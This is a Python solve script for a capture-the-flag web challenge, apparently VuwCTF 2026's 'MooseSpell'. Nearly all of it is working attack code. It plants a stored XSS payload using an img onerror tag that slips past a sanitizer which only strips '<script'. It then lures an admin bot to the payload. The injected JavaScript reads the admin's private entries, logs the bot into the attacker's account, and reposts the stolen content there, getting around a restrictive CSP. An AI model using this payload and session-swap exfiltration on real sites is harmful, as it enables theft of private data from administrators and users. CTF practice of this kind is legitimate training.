#!/usr/bin/env python3
"""
MooseSpell — VuwCTF 2026 (web)

Stored XSS -> admin bot reads the Archmage's grimoire -> same-origin exfiltration
by re-authenticating the bot as our own user and re-inscribing the loot.

Usage:
    python3 solve.py [base_url]
"""

import http.cookiejar
import json
import re
import sys
import time
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1
        else "https://moosespell-51cd4a7b08debe71.challenges.2026.vuwctf.com").rstrip('/')

USER = "moosehax9"
PASS = "hunter2hunter2"

opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def post(path, obj):
    req = urllib.request.Request(BASE + path, data=json.dumps(obj).encode(),
                                 headers={'Content-Type': 'application/json'})
    try:
        return opener.open(req, timeout=60).read().decode()
    except urllib.error.HTTPError as e:          # 202/4xx still carry a JSON body
        return e.read().decode()


def get(path):
    try:
        return opener.open(urllib.request.Request(BASE + path), timeout=60).read().decode()
    except urllib.error.HTTPError as e:          # 404 if the box reset under us
        return e.read().decode()


# The injected script. Runs in the Archmage's session, under
#   CSP: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data:
# so every outbound channel is dead -- we exfiltrate through the app itself.
JS = (
    "(async()=>{"
    # 1. /spells filters by author == current_user.name, so for the bot this is
    #    the Archmage's own grimoire. Harvest the spell ids.
    "const l=await(await fetch('/spells')).text();"
    "const ids=[...new Set([...l.matchAll(/spells\\/([a-z0-9-]{36})/g)].map(m=>m[1]))];"
    # 2. Read each spell body (admin bypasses the ownership check).
    "let o='';"
    "for(const i of ids){"
    "const p=await(await fetch('/spells/'+i)).text();"
    "const m=p.match(/incantation[^>]*>([\\s\\S]*?)<\\/div>/);"
    "o+=(m?m[1]:'?')+' ;; ';}"
    # 3. Become *us*: /login overwrites the httponly jwt_token cookie.
    "await fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({username:'" + USER + "',password:'" + PASS + "'})});"
    # 4. Spell.author is taken from current_user.name -> the loot lands in our
    #    spellbook, readable with an ordinary session.
    "await fetch('/spells',{method:'POST',headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({title:'loot',incantation:o.slice(0,3000)})});"
    "})()"
)

# sanitize() only strips the literal `<script` token; any other tag survives.
PAYLOAD = '<img src=x onerror="' + JS + '">'


def main():
    print(f"[*] target {BASE}")
    print("[*] register:", post("/register", {"username": USER, "password": PASS}).strip())
    print("[*] login   :", post("/login", {"username": USER, "password": PASS}).strip())

    before = set(re.findall(r'/spells/([a-z0-9-]{36})', get("/spells")))

    sid = json.loads(post("/spells", {"title": "pretty please",
                                      "incantation": PAYLOAD}))["id"]
    print(f"[+] payload inscribed as {sid}")

    print("[*] luring the Archmage (this takes ~7s of bot time)...")
    print("[*] report  :", post("/report", {"spell_id": sid}).strip())

    for _ in range(10):
        page = get("/spells")
        for new in set(re.findall(r'/spells/([a-z0-9-]{36})', page)) - before - {sid}:
            flags = re.findall(r'VuwCTF\{[^}]*\}', get("/spells/" + new))
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                return
        time.sleep(2)

    print("[-] no loot spell appeared -- is the bot alive?")


if __name__ == '__main__':
    main()
